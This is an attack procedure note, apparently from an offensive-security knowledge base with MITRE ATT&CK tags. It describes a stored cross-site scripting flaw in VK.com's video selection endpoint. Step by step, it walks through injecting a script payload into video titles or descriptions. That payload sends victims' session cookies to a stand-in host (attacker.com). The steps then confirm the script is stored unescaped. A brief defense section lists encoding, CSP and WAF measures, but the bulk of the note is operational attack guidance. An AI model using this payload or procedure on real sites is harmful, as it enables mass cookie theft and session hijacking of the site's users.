---
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:53.383Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 098bcbba-c94e-49c6-b122-4c4694e7d295
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-Payload-in-Video-Selection

## Summary

This procedure exploits insufficient input sanitization in VK.com's video selection feature to inject and store a malicious JavaScript payload, which persists in the database and executes when rendered in users' browsers.

## Description

The vulnerability resides in al_video.php?act=a_choose_video_box, where user-supplied video metadata (e.g., titles or descriptions) is not properly encoded or sanitized before storage and output. An attacker crafts a payload using HTML script tags to inject JavaScript that can steal cookies or perform other client-side actions. This stored XSS affects all users who view the manipulated video box, potentially leading to widespread session hijacking. Prerequisites include an authenticated VK.com account and access to the video upload interface.

## Requirements

1. Authenticated session on VK.com
2. Access to video selection/upload functionality
3. Attacker-controlled domain for payload callback (e.g., to receive stolen data)

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., htmlspecialchars in PHP) for all user inputs
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous JavaScript payloads in video metadata logs
- Employ Web Application Firewall (WAF) rules to block common XSS patterns

## Objectives

1. Store malicious JavaScript in the video selection data
2. Ensure payload persistence without triggering sanitization
3. Prepare for execution in victim browsers to exfiltrate session data

## Instructions

### Step 1: Prepare Malicious Payload

**Context**: Craft a simple XSS payload that captures and exfiltrates session cookies to an attacker-controlled server.

Use a payload like: `<script>var i=new Image();i.src='http://attacker.com/log?cookie='+document.cookie;</script>` (using an Image object to avoid blocking).

### Step 2: Access Video Selection Interface

**Context**: Navigate to the vulnerable endpoint and locate the input field for video details.

Log in to VK.com, go to the video upload or selection page at https://vk.com/al_video.php?act=a_choose_video_box, and identify the unsanitized input field (e.g., video title or description).

### Step 3: Inject and Submit Payload

**Context**: Append the payload to the input and submit to store it persistently.

Enter legitimate video details followed by the payload in the input field, then submit the form. Verify storage by checking if the payload appears unescaped in the video box preview.

**Expected Output**: Payload stored and visible in the interface without HTML entity encoding.

### Step 4: Validate Injection

**Context**: Confirm the payload is stored by inspecting the page source or using browser dev tools.

View the submitted video box and search for the script tag in the HTML source; it should appear as raw `<script>` without escaping.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- stored-xss
- web-injection
